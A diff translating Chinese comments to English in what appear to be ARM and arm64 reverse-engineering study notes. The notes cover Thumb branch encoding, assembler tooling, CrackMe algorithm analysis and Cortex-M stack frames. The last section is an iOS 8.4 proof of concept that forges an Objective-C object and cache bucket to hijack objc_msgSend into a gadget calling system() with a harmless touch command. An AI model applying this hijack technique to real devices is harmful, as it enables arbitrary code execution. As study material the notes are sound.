@@ -109,7 +109,7 @@ Author: cacorothuo
 - BL/BLX are 32-bit Thumb instructions (two halfwords), **the high halfword comes second** (in a little-endian file, low first). Decoding (to get the target address): the low 11 bits of the high halfword H = offset_high, the low 11 bits of the low halfword L = offset_low; `offset=(offset_high<<12)|(offset_low<<1)`; the sign bit (bit 25) 0 -> forward, `dst=srcPC+4+offset`; 1 -> backward (negate-plus-one for negative), `dst=srcPC+4-|offset|`. Uses: patching jumps/inline calls straight from the formula without the manual; hand-verifying disassembler output.
 ```
 0012  00F0 01F8  bl .Lhelo       ; H=f000→000,L=f801→001;(000<<12)|(001<<1)=2 → 0x12+4+2=0x18 ✓
-00001164  F7FF FFBE  bl _Z4testv ; H=f7ff→7ff,L=ffbe→7be;(7ff<<12)|(7be<<1)=7fff7c 符号位1 → 取 0x84;0x1164+4-0x84=0x10e4 ✓
+00001164  F7FF FFBE  bl _Z4testv ; H=f7ff→7ff,L=ffbe→7be;(7ff<<12)|(7be<<1)=7fff7c has sign bit 1 → use 0x84;0x1164+4-0x84=0x10e4 ✓
 ```
 - Encoding (assembly -> machine code, copy as-is):
 ```c
@@ -118,7 +118,7 @@ offset = dstAddr - srcAddr;
 offset = (offset - 4) & 0x007fffff;
 high = offset >> 12;  low = (offset & 0x00000fff) >> 1;
 machineCode = ((0xFF00 | low) << 16) | (0xF000 | high);
-// BLX <label>:low 奇数先 +1(目标 4 字节对齐),魔数 0xFF00 改 0xEF00,其余同上
+// BLX <label>: add 1 when low is odd (target aligns to 4 bytes); replace magic 0xFF00 with 0xEF00; other steps are unchanged
 ```
 
 ### A tool for converting arm instructions to machine code
@@ -127,7 +127,7 @@ Author: kuty
 Skip the encoding tables and borrow the GCC cross-assembler: write a one-line `.s`, assemble to `.o`, read the machine code (the original tool supports thumb/arm/aarch64 mnemonic -> machine-code lookup). A self-built pipeline:
 ```bash
 echo 'ldr.w pc,[pc,#0]' > t.s
-arm-linux-gnueabi-as -mthumb t.s -o t.o && arm-linux-gnueabi-objdump -d t.o   # 或 objcopy -O binary + xxd
+arm-linux-gnueabi-as -mthumb t.s -o t.o && arm-linux-gnueabi-objdump -d t.o   # Or use objcopy -O binary followed by xxd
 ```
 
 The fastest way to fill exploit bytes, craft junk instructions, and verify hand-computed encodings.
@@ -145,14 +145,14 @@ A 32-bit ARM ELF CrackMe; `main(argc,argv)` strcmps argv[1] against a computed r
 - Stack canary: `LDR R4,[PC,R4]` (the off_AFAC function pointer) -> `LDR LR,[R4]` -> `STR LR,[SP,#0x44]`, verified by `CMP` before exit. The core algorithm (compiler-optimization spots):
 ```asm
 loc_8588:
-LDR     R1, [R3]          ; 取 keys[i]
-LDRB    R12, [R0,#1]!     ; 取 name[i](前索引写回)
+LDR     R1, [R3]          ; Load keys[i]
+LDRB    R12, [R0,#1]!     ; Load name[i] with pre-indexed writeback
 EOR     R1, R1, #7        ; keys[i]^=7
-SMULL   R8, R7, R2, R1    ; 除法变乘法:R2=0x2AAAAAAB
-SUB     R1, R7, R1,ASR#31 ; 符号修正:(R1*魔数>>32)-(R1>>31)
-SUB     R1, R1, #2        ; 源码 +22-24 合并为 -2
+SMULL   R8, R7, R2, R1    ; Replace division with multiplication: R2=0x2AAAAAAB
+SUB     R1, R7, R1,ASR#31 ; Sign correction: (R1*magic>>32)-(R1>>31)
+SUB     R1, R1, #2        ; Source +22-24 is folded into -2
 EOR     R1, R1, R12       ; ^name[i]
-STR     R1, [R3],#4       ; 存回,后索引
+STR     R1, [R3],#4       ; Store back with post-indexing
 CMP     R3, R5
 BNE     loc_8588
 ```
@@ -189,14 +189,14 @@ Author: yjmwxwx
 `.thumb + .syntax unified`, a complete bare-metal Cortex-M stack round-trip (copy as-is; the vector table: `.word stack-top+1`, `.word start+1` — the SP bit-field forces alignment so bit0 is irrelevant there, and the entry +1 means Thumb state):
 ```asm
 duizhanshiyan:
-    push {r0-r12,lr}           @ 13 字压栈
-    mov  r7, sp                @ 备份栈帧基址(Thumb 无 FP 惯例时手动)
-    sub  sp, #0x30             @ 开 0x30 局部变量区
-    # (省略:r0-r12 置新值后 str rN,[sp,#0x04*i] 逐槽放变量)
-    add  sp, #0x30             @ 丢弃变量区,回到压栈后顶
-    # (省略:倒序覆写原 R0-R12 槽)
-    mov  sp, r7                @ 恢复栈帧
-    pop  {r0-r12,pc}           @ 弹回并返回(pop pc = 返回)
+    push {r0-r12,lr}           @ Push 13 words
+    mov  r7, sp                @ Save the stack-frame base manually when the Thumb ABI has no FP convention
+    sub  sp, #0x30             @ Reserve 0x30 bytes for locals
+    # Omitted: after assigning new r0-r12 values, use str rN,[sp,#0x04*i] to populate the variable slots
+    add  sp, #0x30             @ Discard locals and return to the post-push stack top
+    # Omitted: overwrite the original R0-R12 slots in reverse order
+    mov  sp, r7                @ Restore the stack frame
+    pop  {r0-r12,pc}           @ Pop saved registers and return (pop pc returns)
 ```
 - Manual frames: `mov r7,sp` saves the base and `mov sp,r7` restores it before returning — in reversing, seeing "sp stored into some register and then written back" means a manually opened/closed stack frame. `pop {…,pc}` is the standard Thumb return when there is no `pop lr` semantics; large scenes restore symmetrically with `push {r0-r12,lr}`/`pop {r0-r12,pc}`.
 
@@ -253,22 +253,22 @@ A jailbroken iPhone5s on iOS8.4 (arm64), ASLR+DEP+PIE all on, but **dyld_shared_
 2. **Forge an objc object per the gadget's assembly** (each `ldr xN,[x0,#imm]` maps to one `+imm` field in the struct, padded to size):
 ```objc
 struct fake_receiver_t {
-    uint64_t fake_objc_class_ptr;   // +0x00 类指针
+    uint64_t fake_objc_class_ptr;   // +0x00 class pointer
     uint8_t  pad1[0x70-0x8];
-    uint64_t x0;                    // +0x70 ← ldr x0,[x0,#0x70] 取到,做 system 参数
+    uint64_t x0;                    // +0x70 loaded by ldr x0,[x0,#0x70]; used as the system argument
     uint8_t  pad2[0x98-0x70-0x8];
-    uint64_t x1;                    // +0x98 ← ldr x1,[x0,#0x98] 取到,br x1 跳这
+    uint64_t x1;                    // +0x98 loaded by ldr x1,[x0,#0x98]; branch destination for br x1
     char     cmd[1024];
-} fake_receiver;  // 另配 fake_objc_class_t{pad[0x10];cache_buckets_ptr→bucket;mask} + fake_cache_bucket_t{cached_sel; cached_function→gadget}
+} fake_receiver;  // Also construct fake_objc_class_t{pad[0x10];cache_buckets_ptr→bucket;mask} + fake_cache_bucket_t{cached_sel; cached_function→gadget}
 ```
 3. Trigger (objc_msgSend walks into the gadget on a cache hit):
 ```objc
 fake_cache_bucket.cached_sel      = (void*)NSSelectorFromString(@"release");
 fake_cache_bucket.cached_function = (void*)(base + 0xDEF6C);   // gadget
-fake_receiver.x0 = (uint64_t)&fake_receiver.cmd;               // system 参数
-fake_receiver.x1 = (void*)dlsym(RTLD_DEFAULT, "system");       // br x1 目标
+fake_receiver.x0 = (uint64_t)&fake_receiver.cmd;               // Argument to system
+fake_receiver.x1 = (void*)dlsym(RTLD_DEFAULT, "system");       // Destination of br x1
 strcpy(fake_receiver.cmd, "touch /tmp/IceAndFire");
-# (省略:fake_objc_class/fake_receiver 各指针接线)
+# Omitted: connect the fake_objc_class/fake_receiver pointers
 [talker release];
 ```
 
